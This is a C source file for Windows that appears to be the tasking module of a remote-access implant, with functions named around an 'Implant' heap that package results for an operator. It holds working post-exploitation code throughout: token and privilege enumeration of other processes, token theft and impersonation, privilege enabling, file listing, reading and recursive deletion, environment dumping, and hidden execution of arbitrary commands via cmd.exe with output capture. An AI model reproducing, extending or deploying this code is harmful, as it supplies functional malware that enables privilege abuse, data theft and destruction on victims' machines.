#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <sddl.h>
#include <strsafe.h>
#include "debug.h"
#include "error.h"
#include "generated_errors.h"
#include "exports.h"
#include "security.h"

#define WCHAR_NULL_TERMINATOR_COUNT           1U
#define DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT 2U
#define TOKEN_FIELD_FALSE                     0U
#define TOKEN_FIELD_TRUE                      1U
#define PRIVILEGE_NAME_BUFFER_SIZE            256
#define LS_FLAG_DIRECTORY                     1U
#define LS_FLAG_FILE                          0U

static DWORD BuildTokenSummaryResponseFromToken(
	HANDLE tokenHandle,
	DWORD impersonated,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = ERROR_QUERY_TOKEN_USER_FAILED;
	DWORD tokenUserLength = 0;
	DWORD elevationLength = 0;
	DWORD nameLength = 0;
	DWORD domainLength = 0;
	DWORD totalLength = 0;
	DWORD nameBytes = 0;
	DWORD sidBytes = 0;
	TOKEN_USER* tokenUser = NULL;
	TOKEN_ELEVATION tokenElevation = { 0 };
	SID_NAME_USE sidNameUse = SidTypeUnknown;
	LPWSTR sidString = NULL;
	PWSTR userName = NULL;
	PWSTR domainName = NULL;
	PWSTR accountName = NULL;
	PWSTR responseBuffer = NULL;
	TOKEN_SUMMARY_HEADER* responseHeader = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	(void)GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &tokenUserLength);
	if (tokenUserLength == 0)
	{
		return ERROR_QUERY_TOKEN_USER_FAILED;
	}

	tokenUser = (TOKEN_USER*)ImplantHeapAlloc(tokenUserLength);
	if (tokenUser == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenUser,
		tokenUser,
		tokenUserLength,
		&tokenUserLength
	))
	{
		status = ERROR_QUERY_TOKEN_USER_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenElevation,
		&tokenElevation,
		sizeof(tokenElevation),
		&elevationLength
	))
	{
		status = ERROR_QUERY_TOKEN_ELEVATION_FAILED;
		goto cleanup;
	}

	(void)LookupAccountSidW(
		NULL,
		tokenUser->User.Sid,
		NULL,
		&nameLength,
		NULL,
		&domainLength,
		&sidNameUse
	);
	if (nameLength == 0)
	{
		status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
		goto cleanup;
	}

	userName = (PWSTR)ImplantHeapAlloc((SIZE_T)nameLength * sizeof(WCHAR));
	if (userName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	domainName = (PWSTR)ImplantHeapAlloc((SIZE_T)domainLength * sizeof(WCHAR));
	if (domainName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	{
		if (!LookupAccountSidW(
			NULL,
			tokenUser->User.Sid,
			userName,
			&nameLength,
			domainName,
			&domainLength,
			&sidNameUse
		))
		{
			status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
			goto cleanup;
		}

		if (domainLength > 0)
		{
			size_t userNameLength = wcslen(userName);
			size_t domainNameLength = wcslen(domainName);
			size_t combinedCount =
				domainNameLength +
				userNameLength +
				DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT;

			accountName = (PWSTR)ImplantHeapAlloc(combinedCount * sizeof(WCHAR));
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			if (FAILED(StringCchPrintfExW(
				accountName,
				combinedCount,
				NULL,
				NULL,
				0,
				L"%ls\\%ls",
				domainName,
				userName
			)))
			{
				status = ERROR_FORMAT_ACCOUNT_NAME_FAILED;
				goto cleanup;
			}

			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
		else
		{
			size_t accountNameBytes =
				(wcslen(userName) + WCHAR_NULL_TERMINATOR_COUNT) * sizeof(WCHAR);

			accountName = (PWSTR)ImplantHeapAlloc(accountNameBytes);
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			CopyMemory(accountName, userName, accountNameBytes);
			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
	}

	if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidString))
	{
		status = ERROR_CONVERT_SID_TO_STRING_FAILED;
		goto cleanup;
	}

	sidBytes =
		((DWORD)wcslen(sidString) + WCHAR_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR);
	totalLength = sizeof(TOKEN_SUMMARY_HEADER) + nameBytes + sidBytes;

	responseBuffer = (PWSTR)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	responseHeader = (TOKEN_SUMMARY_HEADER*)responseBuffer;
	if (tokenElevation.TokenIsElevated)
	{
		responseHeader->elevated = TOKEN_FIELD_TRUE;
	}
	else
	{
		responseHeader->elevated = TOKEN_FIELD_FALSE;
	}

	responseHeader->impersonated = impersonated;
	responseHeader->userNameLength = nameBytes;
	responseHeader->userSidLength = sidBytes;

	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER),
		accountName,
		nameBytes
	);
	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER) + nameBytes,
		sidString,
		sidBytes
	);

	*responseData = (PBYTE)responseBuffer;
	*responseLen = totalLength;
	responseBuffer = NULL;
	status = NO_ERROR;

cleanup:
	if (responseBuffer != NULL)
	{
		ImplantHeapFree(responseBuffer);
	}
	if (accountName != NULL)
	{
		ImplantHeapFree(accountName);
	}
	if (domainName != NULL)
	{
		ImplantHeapFree(domainName);
	}
	if (userName != NULL)
	{
		ImplantHeapFree(userName);
	}
	if (sidString != NULL)
	{
		LocalFree(sidString);
	}
	if (tokenUser != NULL)
	{
		ImplantHeapFree(tokenUser);
	}

	return status;
}

DWORD BuildCurrentTokenSummaryResponse(PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
	DWORD impersonated = 0;
	HANDLE processToken = NULL;
	HANDLE threadToken = NULL;

	if (responseData != NULL)
	{
		*responseData = NULL;
	}

	if (responseLen != NULL)
	{
		*responseLen = 0;
	}

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY,
		&processToken))
	{
		return ERROR_OPEN_PROCESS_TOKEN_FAILED;
	}

	if (OpenThreadToken(GetCurrentThread(),
		TOKEN_QUERY,
		TRUE,
		&threadToken))
	{
		impersonated = TOKEN_FIELD_TRUE;
		CloseHandle(threadToken);
		threadToken = NULL;
	}
	else if (GetLastError() != ERROR_NO_TOKEN)
	{
		CloseHandle(processToken);
		return ERROR_OPEN_THREAD_TOKEN_FAILED;
	}

	status = BuildTokenSummaryResponseFromToken(
		processToken,
		impersonated,
		responseData,
		responseLen
	);

	CloseHandle(processToken);
	return status;
}

DWORD BuildProcessTokenSummaryResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	TOKEN_TYPE tokenType = TokenPrimary;
	DWORD returnLength = 0;
	DWORD impersonated = TOKEN_FIELD_FALSE;
	PBYTE tokenSummary = NULL;
	DWORD tokenSummaryLen = 0;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
		FALSE,
		processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!OpenProcessToken(processHandle,
		TOKEN_QUERY,
		&tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenType,
		&tokenType,
		sizeof(tokenType),
		&returnLength
	))
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		goto cleanup;
	}

	if (tokenType == TokenImpersonation)
	{
		impersonated = TOKEN_FIELD_TRUE;
	}

	status = BuildTokenSummaryResponseFromToken(
		tokenHandle,
		impersonated,
		&tokenSummary,
		&tokenSummaryLen
	);
	if (status != NO_ERROR)
	{
		goto cleanup;
	}

	finalLength = sizeof(DWORD) + tokenSummaryLen;
	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = processId;
	if (tokenSummaryLen > 0)
	{
		CopyMemory(finalBuffer + sizeof(DWORD), tokenSummary, tokenSummaryLen);
	}

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (tokenSummary != NULL)
	{
		ImplantHeapFree(tokenSummary);
	}
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (processHandle != NULL)
	{
		CloseHandle(processHandle);
	}

	return status;
}

DWORD BuildTokenPrivilegesResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	PTOKEN_PRIVILEGES tokenPrivileges = NULL;
	DWORD returnLength = 0;
	DWORD i = 0;
	DWORD finalLength = sizeof(DWORD) + sizeof(DWORD);
	PBYTE finalBuffer = NULL;
	DWORD offset = 0;
	DWORD validCount = 0;
	DWORD nameChars = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	(void)GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &returnLength);
	if (returnLength == 0)
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		goto cleanup;
	}

	tokenPrivileges = (PTOKEN_PRIVILEGES)ImplantHeapAlloc(returnLength);
	if (tokenPrivileges == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenPrivileges,
		tokenPrivileges,
		returnLength,
		&returnLength
	))
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		goto cleanup;
	}

	for (i = 0; i < tokenPrivileges->PrivilegeCount; i++)
	{
		WCHAR nameBuffer[PRIVILEGE_NAME_BUFFER_SIZE];
		nameChars = PRIVILEGE_NAME_BUFFER_SIZE;

		if (LookupPrivilegeNameW(
			NULL,
			&tokenPrivileges->Privileges[i].Luid,
			nameBuffer,
			&nameChars
		))
		{
			finalLength += sizeof(DWORD) + sizeof(DWORD) + (nameChars * sizeof(WCHAR));
		}
	}

	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)(finalBuffer + offset) = processId;
	offset += sizeof(DWORD);
	offset += sizeof(DWORD);

	for (i = 0; i < tokenPrivileges->PrivilegeCount; i++)
	{
		WCHAR nameBuffer[PRIVILEGE_NAME_BUFFER_SIZE];
		nameChars = PRIVILEGE_NAME_BUFFER_SIZE;

		if (LookupPrivilegeNameW(
			NULL,
			&tokenPrivileges->Privileges[i].Luid,
			nameBuffer,
			&nameChars
		))
		{
			DWORD nameBytes = nameChars * sizeof(WCHAR);

			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > finalLength)
			{
				break;
			}

			*(DWORD*)(finalBuffer + offset) = tokenPrivileges->Privileges[i].Attributes;
			offset += sizeof(DWORD);
			*(DWORD*)(finalBuffer + offset) = nameBytes;
			offset += sizeof(DWORD);
			CopyMemory(finalBuffer + offset, nameBuffer, nameBytes);
			offset += nameBytes;
			validCount++;
		}
	}

	*(DWORD*)(finalBuffer + sizeof(DWORD)) = validCount;
	*responseData = finalBuffer;
	*responseLen = offset;
	finalBuffer = NULL;

cleanup:
	if (tokenPrivileges != NULL)
	{
		ImplantHeapFree(tokenPrivileges);
	}
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (processHandle != NULL)
	{
		CloseHandle(processHandle);
	}

	return status;
}

DWORD ImpersonateProcessToken(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	HANDLE impToken = NULL;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!OpenProcessToken(processHandle,
		TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
		&tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	if (!DuplicateTokenEx(
		tokenHandle,
		TOKEN_IMPERSONATE | TOKEN_QUERY,
		NULL,
		SecurityImpersonation,
		TokenImpersonation,
		&impToken))
	{
		status = ERROR_DUPLICATE_TOKEN_FAILED;
		goto cleanup;
	}

	if (!ImpersonateLoggedOnUser(impToken))
	{
		status = ERROR_IMPERSONATE_FAILED;
		goto cleanup;
	}

	finalLength = sizeof(DWORD) + sizeof(DWORD);
	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = processId;
	*(DWORD*)(finalBuffer + sizeof(DWORD)) = status;

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}
	if (impToken != NULL)
	{
		CloseHandle(impToken);
	}
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (processHandle != NULL)
	{
		CloseHandle(processHandle);
	}

	return status;
}

DWORD EnableCurrentTokenPrivilege(
	PCWSTR privilegeName,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	LUID luid = { 0 };
	TOKEN_PRIVILEGES tp = { 0 };
	DWORD status = NO_ERROR;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;
	DWORD nameBytes = 0;
	HANDLE tokenHandle = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	if (!OpenProcessToken(
		GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		status = ERROR_LOOKUP_PRIVILEGE_VALUE_FAILED;
		goto cleanup;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(
		tokenHandle,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL))
	{
		status = ERROR_ADJUST_TOKEN_PRIVILEGES_FAILED;
		goto cleanup;
	}

	nameBytes = (DWORD)((wcslen(privilegeName) + 1) * sizeof(WCHAR));
	finalLength = sizeof(DWORD) + nameBytes;

	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = status;
	CopyMemory(finalBuffer + sizeof(DWORD), privilegeName, nameBytes);

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}

	return status;
}

static BOOL BuildSearchPattern(PCWSTR path, PWSTR outBuf, SIZE_T outCount)
{
	if (FAILED(StringCchCopyW(outBuf, outCount, path)))
	{
		return FALSE;
	}
	if (FAILED(StringCchCatW(outBuf, outCount, L"\\*")))
	{
		return FALSE;
	}
	return TRUE;
}

static DWORD DeleteDirectoryRecursive(PCWSTR path)
{
	WCHAR searchPattern[MAX_PATH];
	WIN32_FIND_DATAW findData;
	HANDLE findHandle = INVALID_HANDLE_VALUE;
	DWORD status = NO_ERROR;
	WCHAR childPath[MAX_PATH];

	if (!BuildSearchPattern(path, searchPattern, MAX_PATH))
	{
		return ERROR_FORMAT_ACCOUNT_NAME_FAILED;
	}

	findHandle = FindFirstFileW(searchPattern, &findData);
	if (findHandle == INVALID_HANDLE_VALUE)
	{
		return ERROR_LIST_DIRECTORY_FAILED;
	}

	do
	{
		if (wcscmp(findData.cFileName, L".") == 0 ||
			wcscmp(findData.cFileName, L"..") == 0)
		{
			continue;
		}

		if (FAILED(StringCchPrintfW(
			childPath,
			MAX_PATH,
			L"%ls\\%ls",
			path,
			findData.cFileName)))
		{
			status = ERROR_FORMAT_ACCOUNT_NAME_FAILED;
			break;
		}

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			status = DeleteDirectoryRecursive(childPath);
		}
		else
		{
			if (!DeleteFileW(childPath))
			{
				status = ERROR_DELETE_PATH_FAILED;
			}
		}

		if (status != NO_ERROR)
		{
			break;
		}
	} while (FindNextFileW(findHandle, &findData));

	FindClose(findHandle);

	if (status != NO_ERROR)
	{
		return status;
	}

	if (!RemoveDirectoryW(path))
	{
		return ERROR_DELETE_PATH_FAILED;
	}

	return NO_ERROR;
}

DWORD ListDirectory(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
{
	WCHAR searchPattern[MAX_PATH];
	WIN32_FIND_DATAW findData;
	HANDLE findHandle = INVALID_HANDLE_VALUE;
	DWORD entryCount = 0;
	DWORD bufferSize = 0;
	DWORD offset = 0;
	PBYTE buffer = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	if (!BuildSearchPattern(path, searchPattern, MAX_PATH))
	{
		return ERROR_FORMAT_ACCOUNT_NAME_FAILED;
	}

	findHandle = FindFirstFileW(searchPattern, &findData);
	if (findHandle == INVALID_HANDLE_VALUE)
	{
		return ERROR_LIST_DIRECTORY_FAILED;
	}

	bufferSize = sizeof(DWORD);

	do
	{
		if (wcscmp(findData.cFileName, L".") == 0 ||
			wcscmp(findData.cFileName, L"..") == 0)
		{
			continue;
		}

		DWORD nameBytes =
			((DWORD)wcslen(findData.cFileName) + 1) * sizeof(WCHAR);

		bufferSize += sizeof(DWORD) + sizeof(ULONGLONG) +
			sizeof(DWORD) + nameBytes;
		entryCount++;
	} while (FindNextFileW(findHandle, &findData));

	FindClose(findHandle);
	findHandle = INVALID_HANDLE_VALUE;

	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)(buffer + offset) = entryCount;
	offset += sizeof(DWORD);

	findHandle = FindFirstFileW(searchPattern, &findData);
	if (findHandle == INVALID_HANDLE_VALUE)
	{
		ImplantHeapFree(buffer);
		return ERROR_LIST_DIRECTORY_FAILED;
	}

	do
	{
		if (wcscmp(findData.cFileName, L".") == 0 ||
			wcscmp(findData.cFileName, L"..") == 0)
		{
			continue;
		}

		DWORD flags = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			? LS_FLAG_DIRECTORY : LS_FLAG_FILE;

		ULONGLONG fileSize =
			((ULONGLONG)findData.nFileSizeHigh << 32) |
			(ULONGLONG)findData.nFileSizeLow;

		DWORD nameBytes =
			((DWORD)wcslen(findData.cFileName) + 1) * sizeof(WCHAR);

		*(DWORD*)(buffer + offset) = flags;
		offset += sizeof(DWORD);

		*(ULONGLONG*)(buffer + offset) = fileSize;
		offset += sizeof(ULONGLONG);

		*(DWORD*)(buffer + offset) = nameBytes;
		offset += sizeof(DWORD);

		CopyMemory(buffer + offset, findData.cFileName, nameBytes);
		offset += nameBytes;
	} while (FindNextFileW(findHandle, &findData));

	FindClose(findHandle);

	*responseData = buffer;
	*responseLen = offset;
	return NO_ERROR;
}

DWORD ReadFileContents(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
{
	HANDLE fileHandle = INVALID_HANDLE_VALUE;
	DWORD fileSize = 0;
	DWORD bytesRead = 0;
	PBYTE buffer = NULL;
	DWORD status = NO_ERROR;
	DWORD totalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	fileHandle = CreateFileW(
		path,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (fileHandle == INVALID_HANDLE_VALUE)
	{
		return ERROR_OPEN_FILE_FAILED;
	}

	fileSize = GetFileSize(fileHandle, NULL);
	if (fileSize == INVALID_FILE_SIZE)
	{
		status = ERROR_READ_FILE_FAILED;
		goto cleanup;
	}

	totalLength = sizeof(DWORD) + fileSize;
	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (buffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)buffer = fileSize;

	if (fileSize > 0)
	{
		if (!ReadFile(
			fileHandle,
			buffer + sizeof(DWORD),
			fileSize,
			&bytesRead,
			NULL) || bytesRead != fileSize)
		{
			ImplantHeapFree(buffer);
			buffer = NULL;
			status = ERROR_READ_FILE_FAILED;
			goto cleanup;
		}
	}

	*responseData = buffer;
	*responseLen = totalLength;
	buffer = NULL;

cleanup:
	if (fileHandle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(fileHandle);
	}

	return status;
}

DWORD CreateDirectory_(PCWSTR path)
{
	if (!CreateDirectoryW(path, NULL))
	{
		DWORD err = GetLastError();
		if (err == ERROR_ALREADY_EXISTS)
		{
			return ERROR_DIRECTORY_ALREADY_EXISTS;
		}
		return ERROR_CREATE_DIRECTORY_FAILED;
	}
	return NO_ERROR;
}

DWORD DeletePath(PCWSTR path)
{
	DWORD attributes = GetFileAttributesW(path);
	if (attributes == INVALID_FILE_ATTRIBUTES)
	{
		return ERROR_DELETE_PATH_FAILED;
	}

	if (attributes & FILE_ATTRIBUTE_DIRECTORY)
	{
		return DeleteDirectoryRecursive(path);
	}

	if (!DeleteFileW(path))
	{
		return ERROR_DELETE_PATH_FAILED;
	}

	return NO_ERROR;
}

DWORD BuildCurrentUserResponse(PBYTE* responseData, DWORD* responseLen)
{
	if (responseData == NULL || responseLen == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD GetEnvironmentBlock(PBYTE* responseData, DWORD* responseLen)
{
	LPWCH envBlock = NULL;
	LPWCH cursor = NULL;
	DWORD count = 0;
	DWORD bufferSize = sizeof(DWORD);
	PBYTE buffer = NULL;
	DWORD offset = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	envBlock = GetEnvironmentStringsW();
	if (envBlock == NULL)
	{
		return ERROR_GET_ENV_FAILED;
	}

	cursor = envBlock;
	while (*cursor != L'\0')
	{
		LPWCH eq = wcschr(cursor, L'=');
		if (eq != NULL && eq != cursor)
		{
			DWORD nameBytes = (DWORD)((eq - cursor) + 1) * sizeof(WCHAR);
			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);
			bufferSize += sizeof(DWORD) + nameBytes + sizeof(DWORD) + valueBytes;
			count++;
		}
		cursor += wcslen(cursor) + 1;
	}

	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
	if (buffer == NULL)
	{
		FreeEnvironmentStringsW(envBlock);
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	*(DWORD*)(buffer + offset) = count;
	offset += sizeof(DWORD);

	cursor = envBlock;
	while (*cursor != L'\0')
	{
		LPWCH eq = wcschr(cursor, L'=');
		if (eq != NULL && eq != cursor)
		{
			DWORD nameChars = (DWORD)(eq - cursor);
			DWORD nameBytes = (nameChars + 1) * sizeof(WCHAR);
			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);

			*(DWORD*)(buffer + offset) = nameBytes;
			offset += sizeof(DWORD);
			CopyMemory(buffer + offset, cursor, nameChars * sizeof(WCHAR));
			offset += nameChars * sizeof(WCHAR);
			*(WCHAR*)(buffer + offset) = L'\0';
			offset += sizeof(WCHAR);

			*(DWORD*)(buffer + offset) = valueBytes;
			offset += sizeof(DWORD);
			CopyMemory(buffer + offset, eq + 1, valueBytes);
			offset += valueBytes;
		}
		cursor += wcslen(cursor) + 1;
	}

	FreeEnvironmentStringsW(envBlock);

	*responseData = buffer;
	*responseLen = offset;
	return NO_ERROR;
}

DWORD ExecCommand(PCWSTR cmdLine, PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = NO_ERROR;
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	SECURITY_ATTRIBUTES sa = { 0 };
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	WCHAR fullCmd[32768];
	PBYTE outputBuf = NULL;
	DWORD outputCapacity = 65536;
	DWORD outputUsed = 0;
	DWORD bytesRead = 0;
	BYTE readChunk[4096];
	DWORD exitCode = 0;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
	{
		return ERROR_EXEC_FAILED;
	}

	if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
	{
		status = ERROR_EXEC_FAILED;
		goto cleanup;
	}

	if (FAILED(StringCchPrintfW(fullCmd, ARRAYSIZE(fullCmd), L"cmd.exe /C %ls", cmdLine)))
	{
		status = ERROR_EXEC_FAILED;
		goto cleanup;
	}

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.hStdInput = NULL;

	if (!CreateProcessW(
		NULL,
		fullCmd,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		status = ERROR_EXEC_FAILED;
		goto cleanup;
	}

	CloseHandle(hWritePipe);
	hWritePipe = NULL;

	outputBuf = (PBYTE)ImplantHeapAlloc(outputCapacity);
	if (outputBuf == NULL)
	{
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	while (ReadFile(hReadPipe, readChunk, sizeof(readChunk), &bytesRead, NULL) &&
		bytesRead > 0)
	{
		if (outputUsed + bytesRead > outputCapacity)
		{
			DWORD newCap = outputCapacity * 2;
			PBYTE newBuf = (PBYTE)ImplantHeapAlloc(newCap);
			if (newBuf == NULL)
			{
				break;
			}
			CopyMemory(newBuf, outputBuf, outputUsed);
			ImplantHeapFree(outputBuf);
			outputBuf = newBuf;
			outputCapacity = newCap;
		}
		CopyMemory(outputBuf + outputUsed, readChunk, bytesRead);
		outputUsed += bytesRead;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	GetExitCodeProcess(pi.hProcess, &exitCode);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	finalLength = sizeof(DWORD) + sizeof(DWORD) + outputUsed;
	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = exitCode;
	*(DWORD*)(finalBuffer + sizeof(DWORD)) = outputUsed;
	if (outputUsed > 0)
	{
		CopyMemory(finalBuffer + sizeof(DWORD) + sizeof(DWORD), outputBuf, outputUsed);
	}

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (outputBuf != NULL)
	{
		ImplantHeapFree(outputBuf);
	}
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}
	if (hWritePipe != NULL)
	{
		CloseHandle(hWritePipe);
	}
	if (hReadPipe != NULL)
	{
		CloseHandle(hReadPipe);
	}

	return status;
}

// same as EnableCurrentTokenPrivilege but sets Attributes to 0 (disabled)
